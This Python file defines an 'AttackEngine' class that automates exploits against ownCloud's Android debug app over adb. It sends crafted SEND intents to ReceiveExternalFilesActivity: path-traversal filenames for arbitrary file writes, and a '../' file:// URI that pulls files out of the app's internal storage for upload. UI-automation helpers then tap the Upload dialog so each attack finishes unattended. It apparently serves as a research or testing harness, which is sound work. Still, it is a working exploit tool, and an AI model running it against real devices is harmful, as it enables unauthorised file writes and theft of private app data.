
import subprocess
import time
import logging
from typing import Optional, Dict, Any, List
logging.basicConfig(
    level=logging.INFO,
    format='[%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('logs/debug.log', mode='w'),
        logging.StreamHandler()
    ]
)

class AttackEngine:
    """Android device interaction wrapper"""
    
    def __init__(self, device_id: Optional[str] = None):
        self.device_id = device_id
        self.package_name = "com.owncloud.android.debug"
        self.root_enabled = False           # attack engine should not require root
        
    def execute_path_traversal_write_txt(self, payload_path: str, content: str) -> Dict[str, Any]:
        """Execute actual path traversal write exploit like the PoC (no file checking, just command success)"""
        result = {
            "command_executed": False,
            "output": "",
            "error": "",
            "ui_interaction": {}
        }
        try:
            # Build the actual exploit command (like user's PoC)
            cmd = ["adb", "shell", "am", "start"]
            if self.device_id:
                cmd.insert(1, "-s")
                cmd.insert(2, self.device_id)
            cmd.extend([
                "-n", f"{self.package_name}/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity",
                "-t", "text/plain",
                "-a", "android.intent.action.SEND",
                "--es", "android.intent.extra.TEXT", content,
                "--es", "android.intent.extra.TITLE", payload_path
            ])
            logging.info(f"Executing path traversal write exploit: {cmd}")
            exploit_result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            result["command_executed"] = exploit_result.returncode == 0
            result["output"] = exploit_result.stdout
            result["error"] = exploit_result.stderr
            if not result["command_executed"]:
                logging.error(f"Exploit command failed: {exploit_result.stderr}")
                return result
            time.sleep(2)
            ui_result = self._automate_upload_button_click()
            result["ui_interaction"] = ui_result
            if not ui_result["success"]:
                result["error"] = f"UI automation failed: {ui_result['error']}"
                logging.error(result["error"])
            # No file checking or content verification, as root access is not expected
        except Exception as e:
            result["error"] = str(e)
            logging.error(f"Exception in execute_path_traversal_write_txt: {e}")
        return result

    def execute_arbitary_file_upload_from_internal_storage(
        self,
        internal_storage_path: str,
    ) -> Dict[str, Any]:
        """Upload arbitrary files from internal storage using android.intent.extra.STREAM (no file checking, just command success)."""
        result = {
            "command_executed": False,
            "source_file": internal_storage_path,
            "output": "",
            "error": "",
            "ui_interaction": {}
        }

        try:
            cmd = ["adb", "shell", "am", "start"]
            if self.device_id:
                cmd.insert(1, "-s")
                cmd.insert(2, self.device_id)
            cmd.extend([
                "-n", f"{self.package_name}/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity",
                "-t", "text/plain",
                "-a", "android.intent.action.SEND",
                "--eu", "android.intent.extra.STREAM",
                f"file:///data/user/0/com.owncloud.android.debug/cache/../{internal_storage_path}"
            ])
            logging.info(f"Executing arbitrary file upload: {cmd}")
            exploit_result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            result["command_executed"] = exploit_result.returncode == 0
            result["output"] = exploit_result.stdout
            result["error"] = exploit_result.stderr
            if not result["command_executed"]:
                logging.error(f"Exploit command failed: {exploit_result.stderr}")
                return result
            time.sleep(2)
            ui_result = self._automate_upload_button_click()
            result["ui_interaction"] = ui_result
            if not ui_result["success"]:
                result["error"] = f"UI automation failed: {ui_result['error']}"
                logging.error(result["error"])
            # No file checking or content verification, as root access is not expected
        except Exception as e:
            result["error"] = str(e)
            logging.error(f"Exception in execute_arbitary_file_upload_from_internal_storage: {e}")
        return result


    # ----------------------------
    # HELPER FUNCTIONS
    # ----------------------------

    ## REVIEW THIS PART!!
    def _automate_upload_button_click(self) -> Dict[str, Any]:
        """Automate clicking the Upload button using UI Automator (two-step process)"""
        result = {
            "success": False,
            "method_used": "",
            "button_found": False,
            "error": "",
            "found_buttons": [],
            "steps_completed": []
        }
        
        try:
            logging.info("Automating upload button click (two-step process)")
            step1_result = self._click_initial_upload_button()
            result["steps_completed"].append("step1_initial_button")
            if not step1_result["success"]:
                result["error"] = f"Step 1 failed: {step1_result.get('error', 'Unknown error')}"
                logging.error(result["error"])
                return result
            time.sleep(2)
            step2_result = self._click_dialog_upload_button()
            result["steps_completed"].append("step2_dialog_button")
            if step2_result["success"]:
                result["success"] = True
                result["method_used"] = f"Two-step upload: {step1_result['method_used']} -> {step2_result['method_used']}"
                result["button_found"] = True
            else:
                result["error"] = f"Step 2 failed: {step2_result.get('error', 'Unknown error')}"
                logging.error(result["error"])
        except Exception as e:
            result["error"] = str(e)
            logging.error(f"Exception in _automate_upload_button_click: {e}")
        return result
    
    def _click_initial_upload_button(self) -> Dict[str, Any]:
        """Click the initial upload button (Step 1)"""
        result = {
            "success": False,
            "method_used": "",
            "error": ""
        }
        
        try:
            logging.info("Trying known coordinates for initial upload button...")
            known_coords = [(789, 1689), (540, 1400), (540, 1200)]
            for x, y in known_coords:
                tap_cmd = ["adb", "shell", "input", "tap", str(x), str(y)]
                if self.device_id:
                    tap_cmd.insert(1, "-s")
                    tap_cmd.insert(2, self.device_id)
                tap_result = subprocess.run(tap_cmd, capture_output=True, text=True)
                if tap_result.returncode == 0:
                    result["success"] = True
                    result["method_used"] = f"Known coordinates ({x}, {y})"
                    logging.info(f"Clicked initial upload button at ({x}, {y})")
                    return result
            logging.info("Known coordinates failed, trying dynamic detection...")
            dynamic_result = self._find_and_click_upload_button()
            result.update(dynamic_result)
        except Exception as e:
            result["error"] = str(e)
            logging.error(f"Exception in _click_initial_upload_button: {e}")
        return result
    
    def _click_dialog_upload_button(self) -> Dict[str, Any]:
        """Click the upload button in the dialog (Step 2)"""
        result = {
            "success": False,
            "method_used": "",
            "error": ""
        }
        
        try:
            logging.info("Trying known coordinates for dialog upload button...")
            dialog_coords = [(794, 1099), (793, 1099), (800, 1100)]
            for x, y in dialog_coords:
                tap_cmd = ["adb", "shell", "input", "tap", str(x), str(y)]
                if self.device_id:
                    tap_cmd.insert(1, "-s")
                    tap_cmd.insert(2, self.device_id)
                tap_result = subprocess.run(tap_cmd, capture_output=True, text=True)
                if tap_result.returncode == 0:
                    result["success"] = True
                    result["method_used"] = f"Dialog coordinates ({x}, {y})"
                    logging.info(f"Clicked dialog upload button at ({x}, {y})")
                    return result
            logging.info("Known dialog coordinates failed, trying dynamic detection...")
            dump_cmd = ["adb", "shell", "uiautomator", "dump", "/sdcard/dialog_dump.xml"]
            if self.device_id:
                dump_cmd.insert(1, "-s")
                dump_cmd.insert(2, self.device_id)
            dump_result = subprocess.run(dump_cmd, capture_output=True, text=True, timeout=5)
            if dump_result.returncode == 0:
                get_dump_cmd = ["adb", "shell", "cat", "/sdcard/dialog_dump.xml"]
                if self.device_id:
                    get_dump_cmd.insert(1, "-s")
                    get_dump_cmd.insert(2, self.device_id)
                get_dump_result = subprocess.run(get_dump_cmd, capture_output=True, text=True)
                if get_dump_result.returncode == 0:
                    ui_xml = get_dump_result.stdout
                    if 'android:id/button1' in ui_xml and 'UPLOAD' in ui_xml:
                        import re
                        button1_match = re.search(r'resource-id="android:id/button1".*?bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"', ui_xml)
                        if button1_match:
                            x1, y1, x2, y2 = map(int, button1_match.groups())
                            center_x = (x1 + x2) // 2
                            center_y = (y1 + y2) // 2
                            tap_cmd = ["adb", "shell", "input", "tap", str(center_x), str(center_y)]
                            if self.device_id:
                                tap_cmd.insert(1, "-s")
                                tap_cmd.insert(2, self.device_id)
                            tap_result = subprocess.run(tap_cmd, capture_output=True, text=True)
                            if tap_result.returncode == 0:
                                result["success"] = True
                                result["method_used"] = f"Dynamic dialog detection ({center_x}, {center_y})"
                                logging.info(f"Clicked dialog upload button dynamically at ({center_x}, {center_y})")
                                return result
            result["error"] = "Could not find or click dialog upload button"
            logging.error(result["error"])
        except Exception as e:
            result["error"] = str(e)
            logging.error(f"Exception in _click_dialog_upload_button: {e}")
        return result
    
    def _find_and_click_upload_button(self) -> Dict[str, Any]:
        """Find and click upload button dynamically"""
        result = {
            "success": False,
            "method_used": "",
            "error": ""
        }
        
        try:
            logging.info("Dumping UI to find upload button dynamically...")
            dump_cmd = ["adb", "shell", "uiautomator", "dump", "/sdcard/ui_dump.xml"]
            if self.device_id:
                dump_cmd.insert(1, "-s")
                dump_cmd.insert(2, self.device_id)
            dump_result = subprocess.run(dump_cmd, capture_output=True, text=True, timeout=5)
            if dump_result.returncode == 0:
                get_dump_cmd = ["adb", "shell", "cat", "/sdcard/ui_dump.xml"]
                if self.device_id:
                    get_dump_cmd.insert(1, "-s")
                    get_dump_cmd.insert(2, self.device_id)
                get_dump_result = subprocess.run(get_dump_cmd, capture_output=True, text=True)
                if get_dump_result.returncode == 0:
                    ui_xml = get_dump_result.stdout
                    button_candidates = self._find_upload_button_candidates(ui_xml)
                    if button_candidates:
                        best_candidate = button_candidates[0]
                        tap_cmd = ["adb", "shell", "input", "tap", str(best_candidate["center_x"]), str(best_candidate["center_y"])]
                        if self.device_id:
                            tap_cmd.insert(1, "-s")
                            tap_cmd.insert(2, self.device_id)
                        tap_result = subprocess.run(tap_cmd, capture_output=True, text=True)
                        if tap_result.returncode == 0:
                            result["success"] = True
                            result["method_used"] = f"Dynamic detection: '{best_candidate['text']}' at ({best_candidate['center_x']}, {best_candidate['center_y']})"
                            logging.info(f"Clicked upload button dynamically at ({best_candidate['center_x']}, {best_candidate['center_y']})")
                        else:
                            result["error"] = f"Failed to tap button '{best_candidate['text']}'"
                            logging.error(result["error"])
                    else:
                        result["error"] = "No upload button candidates found"
                        logging.error(result["error"])
                else:
                    result["error"] = "Could not read UI dump file"
                    logging.error(result["error"])
            else:
                result["error"] = "UI dump failed"
                logging.error(result["error"])
        except Exception as e:
            result["error"] = str(e)
            logging.error(f"Exception in _find_and_click_upload_button: {e}")
        return result
    
    def _find_upload_button_candidates(self, ui_xml: str) -> List[Dict[str, Any]]:
        """Find and rank upload button candidates from UI XML"""
        import re
        
        candidates = []
        
        # Split into lines for easier parsing
        lines = ui_xml.split('\n')
        
        for line in lines:
            line = line.strip()
            
            # Look for clickable elements
            if 'clickable="true"' not in line:
                continue
            
            # Extract element information
            element_info = self._parse_ui_element(line)
            if not element_info or not element_info['bounds']:
                continue
            
            # Score this element as an upload button candidate
            score = self._score_upload_button_candidate(element_info)
            
            if score > 0:
                element_info['score'] = score
                candidates.append(element_info)
        
        # Sort by score (highest first)
        candidates.sort(key=lambda x: x['score'], reverse=True)
        
        return candidates[:5]  # Return top 5 candidates
    
    def _parse_ui_element(self, element_line: str) -> Dict[str, Any]:
        """Parse a UI element line and extract relevant information"""
        import re
        
        element = {
            'text': '',
            'content_desc': '',
            'resource_id': '',
            'class': '',
            'bounds': None,
            'center_x': 0,
            'center_y': 0
        }
        
        # Extract text
        text_match = re.search(r'text="([^"]*)"', element_line)
        if text_match:
            element['text'] = text_match.group(1)
        
        # Extract content description
        desc_match = re.search(r'content-desc="([^"]*)"', element_line)
        if desc_match:
            element['content_desc'] = desc_match.group(1)
        
        # Extract resource ID
        resource_match = re.search(r'resource-id="([^"]*)"', element_line)
        if resource_match:
            element['resource_id'] = resource_match.group(1)
        
        # Extract class
        class_match = re.search(r'class="([^"]+)"', element_line)
        if class_match:
            element['class'] = class_match.group(1)
        
        # Extract bounds and calculate center
        bounds_match = re.search(r'bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"', element_line)
        if bounds_match:
            x1, y1, x2, y2 = map(int, bounds_match.groups())
            element['bounds'] = (x1, y1, x2, y2)
            element['center_x'] = (x1 + x2) // 2
            element['center_y'] = (y1 + y2) // 2
        
        return element
    
    def _score_upload_button_candidate(self, element: Dict[str, Any]) -> int:
        """Score how likely an element is to be the upload button"""
        score = 0
        
        text = element['text'].lower()
        desc = element['content_desc'].lower()
        resource = element['resource_id'].lower()
        class_name = element['class'].lower()
        
        # High-value keywords
        high_keywords = ['upload', 'send', 'share']
        medium_keywords = ['save', 'ok', 'done', 'submit', 'confirm']
        low_keywords = ['next', 'continue', 'finish']
        
        # Score based on text content
        for keyword in high_keywords:
            if keyword in text:
                score += 10
            if keyword in desc:
                score += 8
            if keyword in resource:
                score += 6
        
        for keyword in medium_keywords:
            if keyword in text:
                score += 5
            if keyword in desc:
                score += 4
            if keyword in resource:
                score += 3
        
        for keyword in low_keywords:
            if keyword in text:
                score += 2
            if keyword in desc:
                score += 1
        
        # Bonus for button-like classes
        if 'button' in class_name:
            score += 3
        
        # Bonus for ownCloud-specific resource IDs
        if 'owncloud' in resource:
            score += 2
        
        # Position-based scoring (buttons often at bottom)
        if element['center_y'] > 800:  # Likely bottom area
            score += 1
        
        return score
    
    def _load_saved_button_config(self) -> Optional[Dict[str, Any]]:
        """Load saved button configuration if available"""
        try:
            import json
            import os
            
            config_file = os.path.join(os.path.dirname(__file__), '..', 'upload_button_config.json')
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    return json.load(f)
        except Exception:
            pass
        
        return None
    